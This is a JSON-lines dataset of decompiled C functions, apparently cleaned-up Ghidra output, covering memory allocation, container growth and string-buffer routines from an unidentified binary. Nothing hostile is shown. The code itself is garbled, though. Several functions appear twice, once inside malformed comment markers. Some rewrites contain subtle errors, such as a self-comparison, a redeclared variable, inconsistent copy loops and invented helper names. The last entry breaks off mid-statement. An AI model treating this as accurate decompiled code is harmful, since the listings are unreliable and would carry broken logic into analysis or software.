{"Function Name": "FUN_1000b440", "Address": "1000b440", "Source Code": "void __fastcall FUN_1000b440(int **int_pointer_ptr)\n{\n    int *int_pointer;            \n    void *current_exception_list;        \n    current_exception_list = exception_list;            \n    exception_list = &current_exception_list;           \n    int_pointer = *int_pointer_ptr;                   \n    if (int_pointer != (int *)0x0) {          \n        (**(code **)(*int_pointer + 8))(int_pointer, data_value ^ (uint)&stack_value); \n    }\n    exception_list = current_exception_list;            \n    return;                               \n}"}
{"Function Name": "FUN_1000b4f0", "Address": "1000b4f0", "Source Code": "void __thiscall FUN_1000b4f0(void *instance, int input_value)\n{\n    uint calculated_value;\n    \n    calculated_value = input_value * 2;\n    \n    if ((uint)(*(int *)((int)instance + 0x14) - *(int *)((int)instance + 0xc) >> 2) < calculated_value) {\n        \n        \n        if (0x3fffffff < calculated_value) {\n            FUN_10005250(); \n            ((code *)swi(3))(); \n            return; \n        }\n        \n        FUN_1000ba50((void *)((int)instance + 0xc), calculated_value);\n    }\n    \n    FUN_1000b7e0((void *)((int)instance + 0xc), calculated_value, *(void **)((int)instance + 4));\n    \n    *(int *)((int)instance + 0x1c) = input_value;\n    \n    *(int *)((int)instance + 0x18) = input_value - 1;\n    return; \n}"}
{"Function Name": "FUN_1000b550", "Address": "1000b550", "Source Code": "void FUN_1000b550(int start_index, int end_index)\n{\n    \n    if (start_index != end_index) {\n        \n        do {\n            \n            FUN_1000b580((int *)(start_index + 4));\n            \n            start_index += 0x10;\n        } while (start_index != end_index); \n    }\n}"}
{"Function Name": "FUN_1000b580", "Address": "1000b580", "Source Code": "void __fastcall FUN_1000b580(int *inputArray)\n{\n    \n    void **pointerToFirstElement = (void **)*inputArray;\n    void **pointerToSecondElement;\n    \n    if (pointerToFirstElement != (void **)0x0) {\n        \n        pointerToSecondElement = (void **)inputArray[1];\n        \n        if (pointerToFirstElement != pointerToSecondElement) {\n            \n            do {\n                \n                FUN_10009410(pointerToFirstElement);\n                \n                pointerToFirstElement += 0xe;\n            } while (pointerToFirstElement != pointerToSecondElement); \n        }\n    }\n    \n    pointerToSecondElement = (void **)*inputArray;\n    \n    if ((0xfff < (uint)(((inputArray[2] - (int)pointerToFirstElement) / 0x38) * 0x38)) &&\n        (pointerToSecondElement = (void **)pointerToFirstElement[-1], 0x1f < (uint)((int)pointerToFirstElement + (-4 - (int)pointerToSecondElement)))) {\n        \n        FUN_1001dea6();\n        \n        ((code *)swi(3))();\n        return; \n    }\n    \n    FUN_10013ceb(pointerToSecondElement);\n    \n    *inputArray = 0;\n    \n    inputArray[1] = 0;\n    \n    inputArray[2] = 0;\n}"}
{"Function Name": "FUN_1000b610", "Address": "1000b610", "Source Code": "void __fastcall FUN_1000b610(int *inputArray)\n{\n    \n    void **firstElementPointer = (void **)*inputArray;\n    void **secondElementPointer;\n    \n    if (firstElementPointer != (void **)0x0) {\n        \n        secondElementPointer = (void **)inputArray[1];\n        \n        \n        if (firstElementPointer != secondElementPointer) {\n            \n            do {\n                \n                FUN_10009f90(firstElementPointer);\n                \n                firstElementPointer += 0x16;\n            } while (firstElementPointer != secondElementPointer); \n        }\n    }\n    \n    \n    secondElementPointer = (void **)*inputArray;\n    \n    \n    if ((0xfff < (uint)(((inputArray[2] - (int)secondElementPointer) / 0x58) * 0x58)) &&\n        (secondElementPointer = (void **)secondElementPointer[-1], 0x1f < (uint)((int)secondElementPointer - 4 - (int)secondElementPointer))) {\n        \n        FUN_1001dea6();\n        \n        ((code *)swi(3))();\n        return; \n    }\n    \n    \n    FUN_10013ceb(secondElementPointer);\n    \n    \n    *inputArray = 0;\n    inputArray[1] = 0;\n    inputArray[2] = 0;\n}"}
{"Function Name": "FUN_1000b960", "Address": "1000b960", "Source Code": "void FUN_1000b960(void **source_pointer, void **destination_pointer)\n{\n    \n    if (source_pointer != destination_pointer) {\n        \n        do {\n            \n            FUN_10009410(source_pointer);\n            \n            source_pointer += 0xe;\n        } while (source_pointer != destination_pointer); \n    }\n}"}
{"Function Name": "FUN_1000b990", "Address": "1000b990", "Source Code": "void FUN_1000b990(void *input_pointer, int threshold_value)\n{\n    void *adjusted_pointer = input_pointer; \n    \n    if ((0xfff < (uint)(threshold_value * 0x38)) && \n        (adjusted_pointer = *(void **)((int)input_pointer - 4), 0x1f < (uint)((int)input_pointer - 4 - (int)adjusted_pointer))) {\n        \n        FUN_1001dea6(); \n        ((code *)swi(3))(); \n        return; \n    }\n    \n    FUN_10013ceb(adjusted_pointer); \n}"}
{"Function Name": "FUN_1000b9e0", "Address": "1000b9e0", "Source Code": "void FUN_1000b9e0(void **start_ptr, void **end_ptr)\n{\n    \n    if (start_ptr != end_ptr) {\n        \n        do {\n            \n            FUN_10009f90(start_ptr);\n            \n            start_ptr += 0x16;\n        } while (start_ptr != end_ptr); \n    }\n}"}
{"Function Name": "FUN_1000bb50", "Address": "1000bb50", "Source Code": "int __thiscall FUN_1000bb50(void *this, undefined4 *param_1, undefined4 *param_2)\n{\n    uint calculatedValue1; \n    code *functionPointer; \n    int calculatedIntegerValue; \n    uint calculatedValue2; \n    uint memoryAllocationValue; \n    int firstMemberValue; \n    uint calculatedOffset; \n    undefined4 *allocatedMemoryPointer; \n    void *traversePointer; \n    void *comparisonPointer; \n    undefined4 *offsetPointer; \n    void *currentExceptionList; \n    currentExceptionList = ExceptionList; \n    ExceptionList = &currentExceptionList; \n    firstMemberValue = *this; \n    calculatedIntegerValue = *(int *)((int)this + 4) - firstMemberValue >> 4; \n    if (calculatedIntegerValue == 0xfffffff) { \n        FUN_10005250(); \n        goto LAB_1000bd1f; \n    }\n    calculatedValue1 = calculatedIntegerValue + 1; \n    calculatedOffset = *(int *)((int)this + 8) - firstMemberValue >> 4; \n    calculatedValue2 = calculatedValue1; \n    if ((calculatedOffset <= 0xfffffff - (calculatedOffset >> 1)) && (calculatedValue2 = (calculatedOffset >> 1) + calculatedOffset, calculatedValue2 < calculatedValue1)) {\n        calculatedValue2 = calculatedValue1; \n    }\n    calculatedOffset = calculatedValue2 * 0x10; \n    if (calculatedValue2 < 0x10000000) { \n        if (0xfff < calculatedOffset) goto LAB_1000bbed; \n        if (calculatedOffset == 0) {\n            allocatedMemoryPointer = (undefined4 *)0x0; \n        } else {\n            allocatedMemoryPointer = (undefined4 *)FUN_10013cf9(calculatedOffset); \n        }\n    } else {\n        calculatedOffset = 0xffffffff; \n    LAB_1000bbed:\n        memoryAllocationValue = calculatedOffset + 0x23; \n        if (memoryAllocationValue <= calculatedOffset) {\n            memoryAllocationValue = 0xffffffff; \n        }\n        calculatedIntegerValue = FUN_10013cf9(memoryAllocationValue); \n        if (calculatedIntegerValue == 0) goto LAB_1000bd1f; \n        allocatedMemoryPointer = (undefined4 *)(calculatedIntegerValue + 0x23U & 0xffffffe0); \n        allocatedMemoryPointer[-1] = calculatedIntegerValue; \n    }\n    calculatedOffset = (int)param_1 - firstMemberValue & 0xfffffff0; \n    *(undefined4 *)(calculatedOffset + (int)allocatedMemoryPointer) = *param_2; \n    FUN_1000c310((void *)(calculatedOffset + 4 + (int)allocatedMemoryPointer), param_2 + 1); \n    undefined4 *puVar9 = *(undefined4 **)((int)this + 4); \n    undefined4 *puVar8 = *this; \n    if (param_1 != puVar9) { \n        FUN_1000c8b0(*this, param_1, allocatedMemoryPointer); \n        puVar9 = *(undefined4 **)((int)this + 4); \n        puVar8 = param_1; \n        offsetPointer = (undefined4 *)(calculatedOffset + 0x10 + (int)allocatedMemoryPointer); \n    }\n    FUN_1000c8b0(puVar8, puVar9, offsetPointer); \n    traversePointer = *this; \n    if (traversePointer != (void *)0x0) { \n        comparisonPointer = *(void **)((int)this + 4); \n        if (traversePointer != comparisonPointer) { \n            do {\n                FUN_1000b580((int *)((int)traversePointer + 4)); \n                traversePointer = (void *)((int)traversePointer + 0x10); \n            } while (traversePointer != comparisonPointer); \n        }\n    }\n    if ((0xfff < (*(int *)((int)this + 8) - (int)traversePointer & 0xfffffff0U)) && \n        (comparisonPointer = *(void **)((int)traversePointer + -4), 0x1f < (uint)((int)traversePointer + (-4 - (int)comparisonPointer)))) { \n    LAB_1000bd1f:\n        FUN_1001dea6(); \n        functionPointer = (code *)swi(3); \n        firstMemberValue = (*functionPointer)(); \n        return firstMemberValue; \n    }\n    FUN_10013ceb(comparisonPointer); \n    *(undefined4 **)this = allocatedMemoryPointer; \n    *(undefined4 **)((int)this + 4) = allocatedMemoryPointer + calculatedValue1 * 4; \n    *(undefined4 **)((int)this + 8) = allocatedMemoryPointer + calculatedValue2 * 4; \n    ExceptionList = currentExceptionList; \n    return *this + calculatedOffset; \n}"}
{"Function Name": "FUN_1000c1f0", "Address": "1000c1f0", "Source Code": "void __fastcall FUN_1000c1f0(undefined4 *source_array, undefined4 *destination_array, undefined4 *data_pointer)\n{\n    \n    uint chunk_count = (uint)((int)destination_array + (3 - (int)source_array)) >> 2;\n    uint iteration_count = 0; \n    \n    if (destination_array < source_array) {\n        chunk_count = 0; \n    }\n    \n    if (chunk_count != 0) {\n        undefined4 *dest_pointer = source_array; \n        \n        if (3 < chunk_count) {\n            \n            if ((data_pointer < source_array) || (source_array + (chunk_count - 1) < data_pointer)) {\n                \n                iteration_count = (chunk_count & 0xfffffffc);\n                \n                for (; iteration_count != 0; iteration_count -= 4) {\n                    *dest_pointer++ = *data_pointer; \n                }\n                \n                dest_pointer = source_array + (chunk_count & 0xfffffffc);\n                \n                for (uint remaining_chunks = chunk_count & 0x3ffffffc; remaining_chunks != 0; remaining_chunks--) {\n                    *source_array++ = *data_pointer; \n                }\n            }\n        }\n    }\n}"}
{"Function Name": "FUN_1000c270", "Address": "1000c270", "Source Code": "void __fastcall FUN_1000c270(void **elements)\n{\n    \n    callFunctionA(elements + 6);\n    \n    \n    if ((void *)0x7 < elements[5]) {\n        void *firstElement = *elements; \n        \n        \n        \n        if ((0xfff < (int)elements[5] * 2 + 2U) &&\n            (firstElement = *(void **)((int)firstElement + -4), 0x1f < (uint)((int)elements[0] + (-4 - (int)firstElement)))) {\n            callFunctionB(); \n            ((code *)systemInterrupt(3))(); \n            return; \n        }\n        \n        \n        callFunctionC(firstElement);\n    }\n    \n    \n    elements[4] = (void *)0x0;\n    \n    \n    elements[5] = (void *)0x7;\n    \n    \n    *(undefined2 *)elements = 0;\n    \n    return; \n}"}
{"Function Name": "FUN_1000c2d0", "Address": "1000c2d0", "Source Code": "void FUN_1000c2d0(void *input_pointer, int multiplier)\n{\n    void *temp_pointer = input_pointer; \n    \n    if ((0xfff < (uint)(multiplier * 0x10)) &&\n        (temp_pointer = *(void **)((int)input_pointer + -4), 0x1f < (uint)((int)input_pointer + (-4 - (int)temp_pointer)))) {\n        \n        FUN_1001dea6(); \n        ((code *)swi(3))(); \n        return; \n    }\n    \n    FUN_10013ceb(temp_pointer); \n}"}
{"Function Name": "FUN_1000c630", "Address": "1000c630", "Source Code": "\\*\nundefined4 * __thiscall FUN_1000c630(void *context, undefined8 *inputArray)\n{\n    \n    uint valueAtIndex2 = *(uint *)(inputArray + 2);\n    uint calculatedValue;\n    \n    *(undefined4 *)((int)context + 0x10) = 0;\n    *(undefined4 *)((int)context + 0x14) = 0;\n    \n    if (7 < *(uint *)((int)inputArray + 0x14)) {\n        \n        inputArray = *(undefined8 **)inputArray;\n    }\n    \n    if (valueAtIndex2 < 8) {\n        \n        *(undefined4 *)context = *(undefined4 *)inputArray;\n        *(undefined4 *)((int)context + 4) = *(undefined4 *)((int)inputArray + 4);\n        *(undefined4 *)((int)context + 8) = *(undefined4 *)(inputArray + 1);\n        *(undefined4 *)((int)context + 0xc) = *(undefined4 *)((int)inputArray + 0xc);\n        \n        *(uint *)((int)context + 0x10) = valueAtIndex2;\n        *(undefined4 *)((int)context + 0x14) = 7;\n        return (undefined4 *)context; \n    }\n    \n    calculatedValue = valueAtIndex2 | 7;\n    \n    if (0x7ffffffe < calculatedValue) {\n        calculatedValue = 0x7ffffffe;\n    }\n    \n    uint adjustedValue = -(uint)(0xfffffffe < calculatedValue) | calculatedValue + 1;\n    uint doubleAdjustedValue = adjustedValue * 2;\n    undefined8 *allocatedMemoryPointer;\n    \n    if (adjustedValue < 0x80000000) {\n        \n        if (doubleAdjustedValue < 0x1000) {\n            \n            allocatedMemoryPointer = (doubleAdjustedValue == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(doubleAdjustedValue);\n            goto LAB_1000c6e4; \n        }\n    } else {\n        \n        doubleAdjustedValue = 0xffffffff;\n    }\n    \n    adjustedValue = doubleAdjustedValue + 0x23;\n    \n    if (adjustedValue <= doubleAdjustedValue) {\n        adjustedValue = 0xffffffff; \n    }\n    \n    int allocationResult = FUN_10013cf9(adjustedValue);\n    if (allocationResult == 0) {\n        \n        FUN_1001dea6();\n        code *errorHandler = (code *)swi(3);\n        return (undefined4 *)(*errorHandler)(); \n    }\n    \n    allocatedMemoryPointer = (undefined8 *)(allocationResult + 0x23U & 0xffffffe0);\n    \n    *(int *)((int)allocatedMemoryPointer - 4) = allocationResult;\nLAB_1000c6e4:\n    \n    *(undefined8 **)context = allocatedMemoryPointer;\n    \n    FUN_10018670(allocatedMemoryPointer, inputArray, valueAtIndex2 * 2 + 2);\n    \n    *(uint *)((int)context + 0x10) = valueAtIndex2;\n    *(uint *)((int)context + 0x14) = calculatedValue;\n    return (undefined4 *)context; \n}\n*\\ \n \nundefined4 * __thiscall FUN_1000c630(void *context, undefined8 *inputArray)\n{\n    uint valueAtIndex2 = *(uint *)(inputArray + 2);\n    uint calculatedValue;\n    *(undefined4 *)((int)context + 0x10) = 0;\n    *(undefined4 *)((int)context + 0x14) = 0;\n    if (7 < *(uint *)((int)inputArray + 0x14)) {\n        inputArray = *(undefined8 **)inputArray;\n    }\n    if (valueAtIndex2 < 8) {\n        *(undefined4 *)context = *(undefined4 *)inputArray;\n        *(undefined4 *)((int)context + 4) = *(undefined4 *)((int)inputArray + 4);\n        *(undefined4 *)((int)context + 8) = *(undefined4 *)(inputArray + 1);\n        *(undefined4 *)((int)context + 0xc) = *(undefined4 *)((int)inputArray + 0xc);\n        *(uint *)((int)context + 0x10) = valueAtIndex2;\n        *(undefined4 *)((int)context + 0x14) = 7;\n        return (undefined4 *)context;\n    }\n    calculatedValue = valueAtIndex2 | 7;\n    if (0x7ffffffe < calculatedValue) {\n        calculatedValue = 0x7ffffffe;\n    }\n    uint adjustedValue = -(uint)(0xfffffffe < calculatedValue) | calculatedValue + 1;\n    uint doubleAdjustedValue = adjustedValue * 2;\n    undefined8 *allocatedMemoryPointer;\n    if (adjustedValue < 0x80000000) {\n        if (doubleAdjustedValue < 0x1000) {\n            allocatedMemoryPointer = (doubleAdjustedValue == 0) ? (undefined8 *)0x0 : (undefined8 *)FUN_10013cf9(doubleAdjustedValue);\n            goto LAB_1000c6e4;\n        }\n    } else {\n        doubleAdjustedValue = 0xffffffff;\n    }\n    adjustedValue = doubleAdjustedValue + 0x23;\n    if (adjustedValue <= doubleAdjustedValue) {\n        adjustedValue = 0xffffffff;\n    }\n    int allocationResult = FUN_10013cf9(adjustedValue);\n    if (allocationResult == 0) {\n        FUN_1001dea6();\n        code *errorHandler = (code *)swi(3);\n        return (undefined4 *)(*errorHandler)();\n    }\n    allocatedMemoryPointer = (undefined8 *)(allocationResult + 0x23U & 0xffffffe0);\n    *(int *)((int)allocatedMemoryPointer - 4) = allocationResult;\nLAB_1000c6e4:\n    *(undefined8 **)context = allocatedMemoryPointer;\n    FUN_10018670(allocatedMemoryPointer, inputArray, valueAtIndex2 * 2 + 2);\n    *(uint *)((int)context + 0x10) = valueAtIndex2;\n    *(uint *)((int)context + 0x14) = calculatedValue;\n    return (undefined4 *)context;\n}"}
{"Function Name": "FUN_1000c8b0", "Address": "1000c8b0", "Source Code": "\\*\nundefined4 * __fastcall FUN_1000c8b0(undefined4 *sourceArray, undefined4 *endArray, undefined4 *destinationArray)\n{\n    undefined4 *sourcePointer = sourceArray + 3; \n    undefined4 *destinationPointer = destinationArray;      \n    if (sourceArray != endArray) {           \n        do {\n            *destinationPointer = sourcePointer[-3];       \n            destinationPointer[1] = sourcePointer[-2];     \n            destinationPointer[2] = sourcePointer[-1];     \n            destinationPointer += 4;                \n            \n            *(undefined4 *)((int)destinationArray + (-0x10 - (int)sourceArray) + (int)(sourcePointer + 4)) = *sourcePointer;\n            sourcePointer[-2] = 0;              \n            sourcePointer[-1] = 0;              \n            *sourcePointer = 0;                 \n            sourcePointer += 4;                 \n        } while (sourcePointer + 1 != endArray); \n    }\n    return destinationPointer;                     \n}\n*\\ \n \nundefined4 * __fastcall FUN_1000c8b0(undefined4 *sourceArray, undefined4 *endArray, undefined4 *destinationArray)\n{\n    undefined4 *sourcePointer = sourceArray + 3;\n    undefined4 *destinationPointer = destinationArray;\n    if (sourceArray != endArray) {\n        do {\n            *destinationPointer = sourcePointer[-3];\n            destinationPointer[1] = sourcePointer[-2];\n            destinationPointer[2] = sourcePointer[-1];\n            destinationPointer += 4;\n            *(undefined4 *)((int)destinationArray + (-0x10 - (int)sourceArray) + (int)(sourcePointer + 4)) = *sourcePointer;\n            sourcePointer[-2] = 0;\n            sourcePointer[-1] = 0;\n            *sourcePointer = 0;\n            sourcePointer += 4;\n        } while (sourcePointer + 1 != endArray);\n    }\n    return destinationPointer;\n}"}
{"Function Name": "FUN_1000c920", "Address": "1000c920", "Source Code": "\\*\nundefined4 * __fastcall FUN_1000c920(undefined4 *input_array, undefined4 *end_array, undefined4 *output_array)\n{\n    undefined4 *input_ptr; \n    undefined4 *output_ptr; \n    undefined4 *result_ptr = output_array; \n    if (input_array != end_array) { \n        input_ptr = input_array + 0xc; \n        output_ptr = output_array + 0xb; \n        do {\n            output_ptr[-7] = 0; \n            output_ptr[-6] = 0; \n            output_ptr[-5] = input_ptr[-6]; \n            output_ptr[-4] = input_ptr[-5]; \n            output_ptr[-1] = 0; \n            *output_ptr = input_ptr[-1]; \n            *(undefined8 *)(output_ptr + -3) = *(undefined8 *)(input_ptr + -4); \n            *result_ptr++ = input_ptr[-0xc]; \n            result_ptr[0] = input_ptr[-0xb]; \n            result_ptr[1] = input_ptr[-10]; \n            result_ptr[2] = input_ptr[-9]; \n            *(undefined8 *)(result_ptr + 3) = *(undefined8 *)(input_ptr + -8); \n            input_ptr[-8] = 0; \n            input_ptr[-7] = 7; \n            input_ptr[-2] = 0; \n            input_ptr[-1] = 0; \n            *input_ptr++ = 0; \n            output_ptr += 0xe; \n        } while (input_ptr + 2 != end_array); \n    }\n    return result_ptr; \n}\n*\\ \n \nundefined4 * __fastcall FUN_1000c920(undefined4 *input_array, undefined4 *end_array, undefined4 *output_array)\n{\n    undefined4 *input_ptr;\n    undefined4 *output_ptr;\n    undefined4 *result_ptr = output_array;\n    if (input_array != end_array) {\n        input_ptr = input_array + 0xc;\n        output_ptr = output_array + 0xb;\n        do {\n            output_ptr[-7] = 0;\n            output_ptr[-6] = 0;\n            output_ptr[-5] = input_ptr[-6];\n            output_ptr[-4] = input_ptr[-5];\n            output_ptr[-1] = 0;\n            *output_ptr = input_ptr[-1];\n            *(undefined8 *)(output_ptr + -3) = *(undefined8 *)(input_ptr + -4);\n            *result_ptr++ = input_ptr[-0xc];\n            result_ptr[0] = input_ptr[-0xb];\n            result_ptr[1] = input_ptr[-10];\n            result_ptr[2] = input_ptr[-9];\n            *(undefined8 *)(result_ptr + 3) = *(undefined8 *)(input_ptr + -8);\n            input_ptr[-8] = 0;\n            input_ptr[-7] = 7;\n            input_ptr[-2] = 0;\n            input_ptr[-1] = 0;\n            *input_ptr++ = 0;\n            output_ptr += 0xe;\n        } while (input_ptr + 2 != end_array);\n    }\n    return result_ptr;\n}"}
{"Function Name": "FUN_1000c9f0", "Address": "1000c9f0", "Source Code": "\\*\nundefined4 * __fastcall FUN_1000c9f0(undefined4 *source_array, undefined4 *destination_array, undefined4 *output_array)\n{\n    undefined4 *source_iterator; \n    int offset_difference; \n    undefined8 *output_iterator; \n    \n    if (source_array != destination_array) {\n        \n        offset_difference = (int)output_array - (int)source_array;\n        source_iterator = source_array + 0xb; \n        output_iterator = (undefined8 *)(output_array + 0x10); \n        do {\n            *(undefined4 *)(output_iterator + -6) = 0; \n            *(undefined4 *)((int)output_iterator + -0x2c) = 0; \n            *output_array = source_iterator[-0xb]; \n            output_array[1] = source_iterator[-10]; \n            output_array[2] = source_iterator[-9]; \n            output_array[3] = source_iterator[-8]; \n            *(undefined8 *)(output_array + 4) = *(undefined8 *)(source_iterator + -7); \n            output_array += 0x16; \n            source_iterator[-7] = 0; \n            source_iterator[-6] = 7; \n            *(undefined2 *)(source_iterator + -0xb) = 0; \n            *(undefined4 *)(output_iterator + -3) = 0; \n            *(undefined4 *)((int)source_iterator + offset_difference) = 0; \n            *(undefined4 *)(output_iterator + -5) = source_iterator[-5]; \n            *(undefined4 *)((int)output_iterator + -0x24) = source_iterator[-4]; \n            *(undefined4 *)(output_iterator + -4) = source_iterator[-3]; \n            *(undefined4 *)((int)output_iterator + -0x1c) = source_iterator[-2]; \n            output_iterator[-3] = *(undefined8 *)(source_iterator + -1); \n            source_iterator[-1] = 0; \n            *source_iterator = 7; \n            *(undefined2 *)(source_iterator + -5) = 0; \n            *(undefined4 *)output_iterator = 0; \n            *(undefined4 *)((int)output_iterator + 4) = 0; \n            *(undefined4 *)(output_iterator + -2) = source_iterator[1]; \n            *(undefined4 *)((int)output_iterator + -0xc) = source_iterator[2]; \n            *(undefined4 *)(output_iterator + -1) = source_iterator[3]; \n            *(undefined4 *)((int)output_iterator + -4) = source_iterator[4]; \n            *output_iterator = *(undefined8 *)(source_iterator + 5); \n            source_iterator[5] = 0; \n            source_iterator[6] = 7; \n            *(undefined2 *)(source_iterator + 1) = 0; \n            *(undefined4 *)(output_iterator + 1) = source_iterator[7]; \n            *(undefined4 *)((int)output_iterator + 0xc) = source_iterator[8]; \n            output_iterator[2] = *(undefined8 *)(source_iterator + 9); \n            source_iterator += 0x16; \n            output_iterator += 0xb; \n        } while (source_iterator + 0xb != destination_array); \n    }\n    return output_array; \n}\n*\\ \n \nundefined4 * __fastcall FUN_1000c9f0(undefined4 *source_array, undefined4 *destination_array, undefined4 *output_array)\n{\n    undefined4 *source_iterator;\n    int offset_difference;\n    undefined8 *output_iterator;\n    if (source_array != destination_array) {\n        offset_difference = (int)output_array - (int)source_array;\n        source_iterator = source_array + 0xb;\n        output_iterator = (undefined8 *)(output_array + 0x10);\n        do {\n            *(undefined4 *)(output_iterator + -6) = 0;\n            *(undefined4 *)((int)output_iterator + -0x2c) = 0;\n            *output_array = source_iterator[-0xb];\n            output_array[1] = source_iterator[-10];\n            output_array[2] = source_iterator[-9];\n            output_array[3] = source_iterator[-8];\n            *(undefined8 *)(output_array + 4) = *(undefined8 *)(source_iterator + -7);\n            output_array += 0x16;\n            source_iterator[-7] = 0;\n            source_iterator[-6] = 7;\n            *(undefined2 *)(source_iterator + -0xb) = 0;\n            *(undefined4 *)(output_iterator + -3) = 0;\n            *(undefined4 *)((int)source_iterator + offset_difference) = 0;\n            *(undefined4 *)(output_iterator + -5) = source_iterator[-5];\n            *(undefined4 *)((int)output_iterator + -0x24) = source_iterator[-4];\n            *(undefined4 *)(output_iterator + -4) = source_iterator[-3];\n            *(undefined4 *)((int)output_iterator + -0x1c) = source_iterator[-2];\n            output_iterator[-3] = *(undefined8 *)(source_iterator + -1);\n            source_iterator[-1] = 0;\n            *source_iterator = 7;\n            *(undefined2 *)(source_iterator + -5) = 0;\n            *(undefined4 *)output_iterator = 0;\n            *(undefined4 *)((int)output_iterator + 4) = 0;\n            *(undefined4 *)(output_iterator + -2) = source_iterator[1];\n            *(undefined4 *)((int)output_iterator + -0xc) = source_iterator[2];\n            *(undefined4 *)(output_iterator + -1) = source_iterator[3];\n            *(undefined4 *)((int)output_iterator + -4) = source_iterator[4];\n            *output_iterator = *(undefined8 *)(source_iterator + 5);\n            source_iterator[5] = 0;\n            source_iterator[6] = 7;\n            *(undefined2 *)(source_iterator + 1) = 0;\n            *(undefined4 *)(output_iterator + 1) = source_iterator[7];\n            *(undefined4 *)((int)output_iterator + 0xc) = source_iterator[8];\n            output_iterator[2] = *(undefined8 *)(source_iterator + 9);\n            source_iterator += 0x16;\n            output_iterator += 0xb;\n        } while (source_iterator + 0xb != destination_array);\n    }\n    return output_array;\n}"}
{"Function Name": "FUN_1000cad0", "Address": "1000cad0", "Source Code": "\\*\nundefined8 * __thiscall\nFUN_1000cad0(void *this, uint param_1, undefined4 param_2, undefined8 *param_3, int param_4)\n{\n    \n    int iVar2 = *(int *)((int)this + 0x10);\n    \n    \n    if (0x7ffffffeU - iVar2 < param_1) {\n        FUN_10005260(); \n        goto LAB_1000cc49; \n    }\n    \n    \n    uint uVar3 = *(uint *)((int)this + 0x14);\n    uint uVar10 = iVar2 + param_1 | 7; \n    \n    \n    if (uVar10 < 0x7fffffff) {\n        \n        if (0x7ffffffe - (uVar3 >> 1) < uVar3) {\n            uVar10 = 0x7ffffffe; \n        } else {\n            uint uVar8 = (uVar3 >> 1) + uVar3; \n            if (uVar10 < uVar8) {\n                uVar10 = uVar8; \n            }\n        }\n    } else {\n        uVar10 = 0x7ffffffe; \n    }\n    \n    \n    uint uVar7 = -(uint)(0xfffffffe < uVar10) | uVar10 + 1; \n    uint uVar8 = uVar7 * 2; \n    undefined8 *puVar9;\n    \n    if (uVar7 < 0x80000000) {\n        if (uVar8 == 0) {\n            puVar9 = (undefined8 *)0x0; \n        } else {\n            puVar9 = (undefined8 *)FUN_10013cf9(uVar8); \n        }\n    } else {\n        uVar8 = 0xffffffff; \n    }\n    \n    if (uVar8 >= 0x80000000) {\n        uVar7 = uVar8 + 0x23; \n        if (uVar7 <= uVar8) {\n            uVar7 = 0xffffffff; \n        }\n        int iVar6 = FUN_10013cf9(uVar7); \n        if (iVar6 == 0) goto LAB_1000cc49; \n        puVar9 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0); \n        *(int *)((int)puVar9 - 4) = iVar6; \n    }\n    \n    *(uint *)((int)this + 0x10) = iVar2 + param_1; \n    *(uint *)((int)this + 0x14) = uVar10; \n    uint uVar10 = iVar2 * 2; \n    undefined2 *puVar1 = (undefined2 *)((int)puVar9 + (param_4 + iVar2) * 2); \n    \n    \n    if (uVar3 < 8) {\n        FUN_10018670(puVar9, (undefined8 *)this, uVar10); \n        FUN_10018670((undefined8 *)(uVar10 + (int)puVar9), param_3, param_4 * 2); \n        *puVar1 = 0; \n        *(undefined8 **)this = puVar9; \n        return (undefined8 *)this; \n    }\n    \n    undefined8 *puVar4 = *this; \n    FUN_10018670(puVar9, puVar4, uVar10); \n    FUN_10018670((undefined8 *)(uVar10 + (int)puVar9), param_3, param_4 * 2); \n    *puVar1 = 0; \n    \n    if ((uVar3 * 2 + 2 < 0x1000) || ((uint)((int)puVar4 + (-4 - (int)*(undefined8 **)((int)puVar4 - 4))) < 0x20))) {\n        FUN_10013ceb(*(undefined8 **)((int)puVar4 - 4)); \n        *(undefined8 **)this = puVar9; \n        return (undefined8 *)this; \n    }\n    \nLAB_1000cc49:\n    FUN_1001dea6(); \n    code *pcVar5 = (code *)swi(3); \n    puVar9 = (undefined8 *)(*pcVar5)(); \n    return puVar9; \n}\n*\\ \n \nundefined8 * __thiscall\nFUN_1000cad0(void *this,uint param_1,undefined4 param_2,undefined8 *param_3,int param_4)\n{\n    int iVar2 = *(int *)((int)this + 0x10);\n    if (0x7ffffffeU - iVar2 < param_1) {\n        FUN_10005260();\n        goto LAB_1000cc49;\n    }\n    \n    uint uVar3 = *(uint *)((int)this + 0x14);\n    uint uVar10 = iVar2 + param_1 | 7;\n    if (uVar10 < 0x7fffffff) {\n        if (0x7ffffffe - (uVar3 >> 1) < uVar3) {\n            uVar10 = 0x7ffffffe;\n        } else {\n            uint uVar8 = (uVar3 >> 1) + uVar3;\n            if (uVar10 < uVar8) {\n                uVar10 = uVar8;\n            }\n        }\n    } else {\n        uVar10 = 0x7ffffffe;\n    }\n    \n    uint uVar7 = -(uint)(0xfffffffe < uVar10) | uVar10 + 1;\n    uint uVar8 = uVar7 * 2;\n    undefined8 *puVar9;\n    if (uVar7 < 0x80000000) {\n        if (uVar8 == 0) {\n            puVar9 = (undefined8 *)0x0;\n        } else {\n            puVar9 = (undefined8 *)FUN_10013cf9(uVar8);\n        }\n    } else {\n        uVar8 = 0xffffffff;\n    }\n    if (uVar8 >= 0x80000000) {\n        uVar7 = uVar8 + 0x23;\n        if (uVar7 <= uVar8) {\n            uVar7 = 0xffffffff;\n        }\n        int iVar6 = FUN_10013cf9(uVar7);\n        if (iVar6 == 0) goto LAB_1000cc49;\n        puVar9 = (undefined8 *)(iVar6 + 0x23U & 0xffffffe0);\n        *(int *)((int)puVar9 - 4) = iVar6;\n    }\n    *(uint *)((int)this + 0x10) = iVar2 + param_1;\n    *(uint *)((int)this + 0x14) = uVar10;\n    uint uVar10 = iVar2 * 2;\n    undefined2 *puVar1 = (undefined2 *)((int)puVar9 + (param_4 + iVar2) * 2);\n    \n    if (uVar3 < 8) {\n        FUN_10018670(puVar9, (undefined8 *)this, uVar10);\n        FUN_10018670((undefined8 *)(uVar10 + (int)puVar9), param_3, param_4 * 2);\n        *puVar1 = 0;\n        *(undefined8 **)this = puVar9;\n        return (undefined8 *)this;\n    }\n    undefined8 *puVar4 = *this;\n    FUN_10018670(puVar9, puVar4, uVar10);\n    FUN_10018670((undefined8 *)(uVar10 + (int)puVar9), param_3, param_4 * 2);\n    *puVar1 = 0;\n    if ((uVar3 * 2 + 2 < 0x1000) || ((uint)((int)puVar4 + (-4 - (int)*(undefined8 **)((int)puVar4 - 4))) < 0x20))) {\n        FUN_10013ceb(*(undefined8 **)((int)puVar4 - 4));\n        *(undefined8 **)this = 